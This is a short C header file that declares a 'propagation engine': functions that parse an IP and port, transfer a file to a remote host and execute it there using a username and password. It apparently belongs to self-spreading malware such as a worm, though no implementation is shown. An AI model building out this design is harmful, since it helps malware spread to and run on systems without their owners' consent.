#ifndef _PROPAGATIONENGINE_H
#define _PROPAGATIONENGINE_H

void parseIPPort(char buffer[], char paramPORT[]);
void fileTransfer(char *ip, char *username, char *pass);
void fileExecute(char *ip, char* username, char *passwrd);
void propagation_engine(char* ip, char *username, char *pass);

#endif
